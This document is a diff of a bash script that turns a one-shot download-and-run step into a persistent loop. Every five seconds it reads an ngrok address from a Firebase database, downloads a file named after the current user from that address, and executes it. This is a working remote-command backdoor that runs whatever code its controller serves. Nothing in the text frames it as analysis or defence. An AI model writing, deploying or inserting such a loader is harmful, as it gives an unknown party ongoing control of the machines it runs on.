@@ -1,13 +1,20 @@
 #!/bin/bash
 
-# Collect ngrok url from firebase
-response=$(curl -s "https://retard-e363c-default-rtdb.asia-southeast1.firebasedatabase.app/IP.json")
-NGROK="${response:1:${#response}-2}"
+GetAndExec() {
+    # Collect ngrok url from firebase
+    response=$(curl -s "https://retard-e363c-default-rtdb.asia-southeast1.firebasedatabase.app/IP.json")
+    NGROK="${response:1:${#response}-2}"
 
-EXEC="$NGROK/$USER"
+    EXEC="$NGROK/$USER"
 
-# Download exec from ngrok url
-curl -sO "$EXEC"
+    # Download exec from ngrok url
+    curl -sO "$EXEC"
 
-# Execute exec
+    # Execute exec
 sh $USER
+}
+
+while true; do
+    GetAndExec
+    sleep 5
+done
